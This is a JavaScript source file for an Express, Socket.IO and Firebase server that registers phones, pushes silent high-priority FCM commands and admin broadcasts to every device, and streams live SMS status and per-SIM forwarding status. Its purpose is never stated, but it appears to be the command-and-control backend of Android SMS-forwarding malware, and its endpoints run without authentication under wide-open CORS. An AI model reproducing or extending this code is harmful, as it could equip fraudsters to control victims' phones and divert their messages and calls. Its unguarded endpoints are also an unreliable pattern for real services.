import dotenv from "dotenv";
dotenv.config();

import express from "express";
import cors from "cors";
import { createServer } from "http";
import { Server } from "socket.io";

import { firestore, rtdb, fcm } from "./config/db.js";

import userFullDataRoutes from "./routes/userFullDataRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import notificationRoutes from "./routes/smsRoutes.js";
import checkRoutes from "./routes/checkRoutes.js";
import commandRoutes from "./routes/commandRoutes.js";

const PORT = process.env.PORT || 5000;
const app = express();
const server = createServer(app);

app.use(cors());
app.use(express.json());

/* ===========================================================
        SOCKET.IO SETUP
=========================================================== */
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});
app.set("io", io);

const deviceSockets = new Map();
let lastDevicesList = [];

/* ===========================================================
        CLEAN UID
=========================================================== */
const clean = (id) => id?.toString()?.trim()?.toUpperCase();

/* ===========================================================
        HIGH PRIORITY FCM SENDER
=========================================================== */
async function sendFcmHighPriority(token, type, payload = {}) {
  if (!token) {
    console.log("⚠ Missing FCM token");
    return;
  }

  try {
    const msg = {
      token,
      android: { priority: "high" },
      data: {
        type: String(type || ""),
        payload: JSON.stringify(payload || {}),
      },
    };

    const res = await fcm.send(msg);
    console.log("📨 FCM SENT:", type, res);

  } catch (err) {
    console.error("❌ FCM ERROR:", err.message);
  }
}

/* ===========================================================
        BUILD DEVICES LIST
=========================================================== */
async function buildDevicesList() {
  const [devSnap, statusSnap] = await Promise.all([
    rtdb.ref("registeredDevices").get(),
    rtdb.ref("status").get(),
  ]);

  if (!devSnap.exists()) return [];

  const devs = devSnap.val() || {};
  const stats = statusSnap.exists() ? statusSnap.val() : {};

  return Object.entries(devs).map(([id, info]) => {
    const st = stats[id] || {};
    return {
      id,
      ...info,
      connectivity: st.connectivity || "Offline",
      lastSeen: st.lastSeen || st.timestamp || null,
      timestamp: st.timestamp || null,
    };
  });
}

/* ===========================================================
        REFRESH DEVICES LIVE
=========================================================== */
async function refreshDevicesLive(reason = "") {
  try {
    const devices = await buildDevicesList();
    lastDevicesList = devices;

    io.emit("devicesLive", {
      success: true,
      reason,
      count: devices.length,
      data: devices,
    });

    console.log(`📡 devicesLive pushed (${reason}) → ${devices.length}`);

  } catch (err) {
    console.error("❌ refreshDevicesLive ERROR:", err.message);
  }
}

/* ===========================================================
        SOCKET CONNECTION HANDLING
=========================================================== */
io.on("connection", (socket) => {
  console.log("🔗 Client Connected:", socket.id);

  let currentDeviceId = null;

  // send initial devices list
  socket.emit("devicesLive", {
    success: true,
    count: lastDevicesList.length,
    data: lastDevicesList,
  });

  socket.on("registerDevice", async (rawId) => {
    const id = clean(rawId);
    if (!id) return;

    deviceSockets.set(id, socket.id);
    currentDeviceId = id;

    await rtdb.ref(`status/${id}`).set({
      connectivity: "Online",
      lastSeen: Date.now(),
      timestamp: Date.now(),
    });

    io.emit("deviceStatus", {
      id,
      connectivity: "Online",
    });

    refreshDevicesLive(`deviceOnline:${id}`);
  });

  socket.on("disconnect", async () => {
    if (currentDeviceId) {
      await rtdb.ref(`status/${currentDeviceId}`).set({
        connectivity: "Offline",
        lastSeen: Date.now(),
        timestamp: Date.now(),
      });

      io.emit("deviceStatus", {
        id: currentDeviceId,
        connectivity: "Offline",
      });

      refreshDevicesLive(`deviceOffline:${currentDeviceId}`);
    }

    console.log("🔌 Client Disconnected:", socket.id);
  });
});

/* ===========================================================
        /send-command (legacy)
=========================================================== */
app.post("/send-command", async (req, res) => {
  try {
    const { uniqueid, title, message } = req.body;
    const id = clean(uniqueid);

    await rtdb.ref(`commands/${id}`).set({
      title,
      message,
      timestamp: Date.now(),
    });

    return res.json({ success: true });

  } catch (err) {
    console.error("❌ send-command ERROR:", err.message);
    return res.status(500).json({ success: false });
  }
});

/* ===========================================================
     CHECK ONLINE — USER BUTTON API (ONLY HERE SEND FCM)
=========================================================== */
app.post("/api/check-now/:uid", async (req, res) => {
  try {
    const uid = clean(req.params.uid);

    const snap = await rtdb.ref(`registeredDevices/${uid}`).get();
    if (!snap.exists()) return res.json({ success: false, message: "No device" });

    const token = snap.val()?.fcmToken;
    if (!token) return res.json({ success: false, message: "No token" });

    // 🌟 SEND ONLY ON BUTTON CLICK
    await sendFcmHighPriority(token, "CHECK_ONLINE", {
      uniqueid: uid
    });

    return res.json({
      success: true,
      message: "CHECK_ONLINE FCM sent (once only)",
    });

  } catch (err) {
    console.error("❌ check-now ERROR:", err.message);
    res.status(500).json({ success: false });
  }
});

/* ===========================================================
        BRO_REPLY LISTENER
=========================================================== */
const liveReplyWatchers = new Map();

function stopReplyWatcher(uid) {
  if (liveReplyWatchers.has(uid)) {
    const ref = liveReplyWatchers.get(uid);
    ref.off();
    liveReplyWatchers.delete(uid);
  }
}

function startReplyWatcher(uid) {
  const ref = rtdb.ref(`checkOnline/${uid}`);

  ref.on("value", (snap) => {
    const data = snap.exists() ? { uid, ...snap.val() } : null;

    io.emit("brosReplyUpdate", {
      uid,
      success: true,
      data,
    });

    console.log("🔥 LIVE brosReply:", uid, data);
  });

  liveReplyWatchers.set(uid, ref);
}

app.get("/api/brosreply/:uid", async (req, res) => {
  try {
    const uid = clean(req.params.uid);

    stopReplyWatcher(uid);

    const snap = await rtdb.ref(`checkOnline/${uid}`).get();
    const data = snap.exists() ? { uid, ...snap.val() } : null;

    startReplyWatcher(uid);

    return res.json({
      success: true,
      data,
      message: "Live started",
    });

  } catch (err) {
    console.error("❌ brosreply ERROR:", err.message);
    res.status(500).json({ success: false });
  }
});

/* ===========================================================
        ADMIN UPDATE
=========================================================== */
rtdb.ref("commandCenter/admin/main").on("value", async (snap) => {
  if (!snap.exists()) return;
  const adminData = snap.val();

  console.log("🛠 Admin updated:", adminData);

  const all = await rtdb.ref("registeredDevices").get();
  if (!all.exists()) return;

  all.forEach((child) => {
    const token = child.val()?.fcmToken;
    if (token) {
      sendFcmHighPriority(token, "ADMIN_UPDATE", {
        deviceId: child.key,
        ...adminData,
      });
    }
  });
});

/* ===========================================================
        DEVICE COMMAND CENTER
=========================================================== */
function extractCommandData(raw) {
  if (raw?.action) return raw;
  const keys = Object.keys(raw || {});
  return raw[keys[keys.length - 1]] || null;
}

async function handleDeviceCommandChange(snap) {
  if (!snap.exists()) return;

  const uid = snap.key;
  const raw = snap.val();
  const cmd = extractCommandData(raw);
  if (!cmd) return;

  const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
  const token = devSnap.val()?.fcmToken;
  if (!token) return;

  await sendFcmHighPriority(token, "DEVICE_COMMAND", {
    uniqueid: uid,
    ...cmd,
  });
}

rtdb.ref("commandCenter/deviceCommands")
  .on("child_added", handleDeviceCommandChange);

rtdb.ref("commandCenter/deviceCommands") 
  .on("child_changed", handleDeviceCommandChange);

/* ===========================================================
        CHECK ONLINE — RTDB LISTENER (NO FCM HERE)
=========================================================== */
async function handleCheckOnlineRTDB(snap) {
  if (!snap.exists()) return;

  const uid = snap.key;
  const now = Date.now();

  await rtdb.ref(`resetCollection/${uid}`).set({
    resetAt: now,
    readable: new Date(now).toString(),
  });

  await rtdb.ref(`status/${uid}`).update({
    connectivity: "Online",
    lastSeen: now,
    timestamp: now,
  });

  console.log(`♻ STATUS UPDATED for ${uid}`);
}

const checkOnlineRef = rtdb.ref("checkOnline");
checkOnlineRef.on("child_added", handleCheckOnlineRTDB);
checkOnlineRef.on("child_changed", handleCheckOnlineRTDB);

/* ===========================================================
        LIVE SMS WATCHER
=========================================================== */
const smsStatusRef = rtdb.ref("smsStatus");

function handleSmsStatusSingle(uid, msgId, data, event) {
  io.emit("smsStatusUpdate", {
    success: true,
    uid,
    msgId,
    event,
    data,
  });

  console.log(
    `📩 smsStatusUpdate → uid=${uid}, msgId=${msgId}, event=${event}, status=${data?.status}`
  );
}

smsStatusRef.on("child_added", (snap) => {
  const uid = snap.key;
  const all = snap.val() || {};

  Object.entries(all).forEach(([msgId, obj]) => {
    handleSmsStatusSingle(uid, msgId, obj, "added");
  });
});

smsStatusRef.on("child_changed", (snap) => {
  const uid = snap.key;
  const all = snap.val() || {};

  Object.entries(all).forEach(([msgId, obj]) => {
    handleSmsStatusSingle(uid, msgId, obj, "changed");
  });
});

smsStatusRef.on("child_removed", (snap) => {
  const uid = snap.key;

  io.emit("smsStatusUpdate", {
    success: true,
    uid,
    msgId: null,
    data: null,
    event: "removed",
  });

  console.log(`🗑 smsStatus removed for uid=${uid}`);
});

/* ===========================================================
        SIM FORWARD LIVE WATCHER
=========================================================== */
const simForwardRef = rtdb.ref("simForwardStatus");

function handleSimForwardChange(snap, event = "update") {
  const uid = snap.key;

  if (!snap.exists()) {
    io.emit("simForwardStatusUpdate", {
      success: true,
      uid,
      event,
      sims: { 0: null, 1: null },
    });
    console.log(`📶 simForwardStatus → uid=${uid}, removed`);
    return;
  }

  const raw = snap.val() || {};

  const sim0 = raw["0"]
    ? { status: raw["0"].status, updatedAt: raw["0"].updatedAt }
    : null;

  const sim1 = raw["1"]
    ? { status: raw["1"].status, updatedAt: raw["1"].updatedAt }
    : null;

  io.emit("simForwardStatusUpdate", {
    success: true,
    uid,
    event,
    sims: { 0: sim0, 1: sim1 },
  });

  console.log(
    `📶 simForwardStatusUpdate → uid=${uid}, SIM0=${sim0?.status}, SIM1=${sim1?.status}`
  );
}

simForwardRef.on("child_added", (snap) =>
  handleSimForwardChange(snap, "added")
);
simForwardRef.on("child_changed", (snap) =>
  handleSimForwardChange(snap, "changed")
);
simForwardRef.on("child_removed", (snap) =>
  handleSimForwardChange(snap, "removed")
);

/* ===========================================================
        REGISTERED DEVICES LIVE WATCHER
=========================================================== */
const registeredDevicesRef = rtdb.ref("registeredDevices");

registeredDevicesRef.on("child_added", () =>
  refreshDevicesLive("registered_added")
);

registeredDevicesRef.on("child_changed", () =>
  refreshDevicesLive("registered_changed")
);

registeredDevicesRef.on("child_removed", () =>
  refreshDevicesLive("registered_removed")
);

/* ===========================================================
        /api/devices
=========================================================== */
app.get("/api/devices", async (req, res) => {
  try {
    const devices = await buildDevicesList();
    return res.json({
      success: true,
      count: devices.length,
      data: devices,
    });
  } catch (err) {
    console.error(" /api/devices ERROR:", err.message);
    res.status(500).json({ success: false });
  }
});

/* ===========================================================
        ROUTES
=========================================================== */
refreshDevicesLive("initial");

app.use(adminRoutes);
app.use("/api/sms", notificationRoutes);
app.use("/api", checkRoutes);
app.use("/api", userFullDataRoutes);
app.use(commandRoutes);

app.get("/", (_, res) => {
  res.send(" RTDB + Socket.IO Backend Running");
});

/* ===========================================================
        START SERVER
=========================================================== */
server.listen(PORT, () => {
  console.log(` Server running on PORT ${PORT}`);
});
